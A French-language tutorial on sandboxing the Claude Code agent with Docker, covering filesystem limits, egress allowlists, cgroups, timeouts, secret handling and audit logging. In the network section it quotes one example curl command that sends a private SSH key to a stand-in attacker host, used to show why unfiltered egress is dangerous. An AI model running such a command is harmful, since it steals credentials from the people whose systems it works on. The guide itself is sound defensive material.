## Concept — le principe du moindre privilège appliqué à Claude

Claude en prod **exécute du code** (Bash, Edit, Write). La question n'est pas « est-ce qu'il est safe ? » mais « qu'est-ce qu'il peut faire dans le pire cas ? ». Trois couches à contrôler :

1. **Filesystem** — quoi il peut lire, quoi il peut écrire.
2. **Network** — vers qui il peut parler.
3. **Compute** — combien de CPU/RAM/temps il peut brûler.

Un bon sandbox borne les trois.

## Image Docker officielle

```dockerfile
FROM anthropic/claude-code:latest

# User non-root
RUN useradd -m -u 1000 claude
USER claude
WORKDIR /workspace

# Le projet monté en bind
VOLUME /workspace
```

Alternative : `FROM node:20-alpine` + `npm install -g @anthropic-ai/claude-code` si tu préfères construire la tienne.

## Filesystem — ce qui compte

### Bind mount read-only quand possible

```bash
docker run --rm \
  -v "$PWD:/workspace:ro" \     # read-only
  -v "/tmp/claude-work:/work" \ # zone de travail writable, éphémère
  anthropic/claude-code \
  claude --prompt "..." --cwd /workspace
```

Claude peut lire le projet mais **pas modifier**. Pour un agent de review ou d'analyse, c'est suffisant.

### Pour un agent qui DOIT écrire

Deux patterns :

1. **Worktree isolé** : clone le repo dans un tmpfs, Claude modifie, tu diffes et committe si OK.
2. **Git commits dans un fork-branch** : Claude commit dans une branche éphémère, impossible d'écrire sur `main`.

### Chemins à toujours bloquer

```bash
# tmpfs pour les caches
--tmpfs /tmp
--tmpfs /home/claude/.cache

# read-only sur system paths
--read-only
```

Le flag `--read-only` de Docker rend **tout** le FS read-only sauf les mounts explicites. Combiné avec `--tmpfs`, tu as un container où Claude ne peut rien persister hors des endroits que tu choisis.

## Network — egress restreint

Le problème : sans filtrage réseau, Claude pourrait `curl https://attacker.example/steal?data=$(cat ~/.ssh/id_rsa)`. Même avec FS protégé, un tool réseau mal borné est un trou.

### Solution 1 — `--network none`

Coupe tout. Fonctionne pour un agent de review offline, mais Claude ne peut plus appeler l'API Anthropic — donc **inutilisable pour la plupart des cas**.

### Solution 2 — proxy egress + allowlist

```bash
docker run --network claude-net \
  -e HTTPS_PROXY=http://proxy:3128 \
  ...
```

Dans le proxy, tu n'autorises que `api.anthropic.com`, `github.com`, et ce qui est strictement nécessaire. Tout autre outbound échoue.

### Solution 3 — Docker network custom + iptables

```bash
docker network create --internal claude-net   # pas de sortie externe par défaut
```

Puis autorise `api.anthropic.com` via un sidecar ou un init container.

## Compute — cgroups

```bash
docker run \
  --cpus 1.0 \                 # 1 vCPU max
  --memory 1g \                # 1 GB RAM max
  --memory-swap 1g \           # pas de swap
  --pids-limit 100 \           # max 100 process
  ...
```

Protège contre :

- Agent qui lance `while true; do something; done` dans un Bash.
- Fork bomb accidentelle.
- Leak mémoire sur un run long.

## Timeouts — toujours un hard kill

Niveau SDK :

```python
options = ClaudeAgentOptions(max_turns=10, ...)
```

Niveau docker :

```bash
docker run --stop-timeout 300 ...    # SIGKILL après 5 min de grace period
timeout 600 docker run ...           # wrapper shell qui tue après 10 min
```

Niveau k8s :

```yaml
spec:
  activeDeadlineSeconds: 600
```

**Empiler** les timeouts est une bonne chose — si l'un rate (bug SDK, signal bloqué), l'autre prend le relais.

## Secrets — ne jamais en laisser dans l'env du container

Mauvais :

```bash
docker run -e ANTHROPIC_API_KEY=$KEY ...
```

Le secret apparaît dans `docker inspect`, les logs du runtime, etc.

Bon :

```bash
# avec Docker secrets (Swarm ou compose)
docker run --secret anthropic-api-key ...

# ou avec un sidecar qui fetch depuis Vault/AWS Secrets Manager
# et exporte via volume tmpfs
```

En SDK, lire le secret depuis un fichier monté plutôt que l'env :

```python
with open("/run/secrets/anthropic-api-key") as f:
    os.environ["ANTHROPIC_API_KEY"] = f.read().strip()
```

## Audit logging

Tu veux savoir **qui** a déclenché **quelle** action, **quand**. Le SDK produit déjà les `ToolUseBlock` — il suffit de les logger :

```python
import structlog

log = structlog.get_logger()

async for msg in query(...):
    if msg.type == "tool_use":
        log.info("tool_use",
                 tool=msg.name,
                 input=msg.input,
                 request_id=request_id,
                 user_id=user_id)
```

Pousse ça vers Loki/Datadog/Splunk. En cas d'incident, tu peux reconstituer le run exact.

## `--dangerously-skip-permissions` — quand c'est justifié

Le flag CLI qui désactive les protections sur les chemins sensibles. **Exemple légitime** : dans un container jetable sur du code 100% fictif où on _veut_ que l'agent itère sans friction.

**Check-list avant de l'utiliser** :

- Container éphémère (détruit après le run).
- FS monté explicitement, aucun secret présent.
- Network restreint à `api.anthropic.com`.
- CPU/RAM cappés.
- Hard timeout actif.

Si un seul de ces points manque, ce flag est **inacceptable**.

## Pattern complet — une config CI prod

```yaml
# docker-compose.yml pour un job CI
services:
  claude-review:
    image: anthropic/claude-code:latest
    user: "1000:1000"
    read_only: true
    tmpfs:
      - /tmp
      - /home/claude/.cache
    volumes:
      - ./repo:/workspace:ro
      - /tmp/work:/work
    networks:
      - claude-net
    cpus: 1.0
    mem_limit: 1g
    pids_limit: 100
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    environment:
      HTTPS_PROXY: http://proxy:3128
    secrets:
      - anthropic-api-key
    command: ["claude", "--prompt", "Review /workspace"]

networks:
  claude-net:
    driver: bridge
    internal: false

secrets:
  anthropic-api-key:
    file: ./secrets/anthropic-api-key.txt
```

Chaque ligne correspond à une protection discutée plus haut. À copier-coller comme baseline.

## Piège #1 — confiance dans `allowed_tools`

Restreindre `allowed_tools` est bien, mais **ça ne protège pas** contre un Bash avec une commande malveillante si `Bash` est dans la liste. Le sandbox OS-level protège ; la liste de tools est une couche d'optimisation, pas de sécurité absolue.

## Piège #2 — logs qui contiennent les prompts

Un log qui imprime chaque `AssistantMessage.content` peut contenir des PII/secrets rappelés par l'utilisateur. Filtre/scrub avant de logger, et rétention courte.

## Piège #3 — image non pinnée

`anthropic/claude-code:latest` change. Un build reproductible pinne la version :

```dockerfile
FROM anthropic/claude-code:2.5.4@sha256:abc123...
```
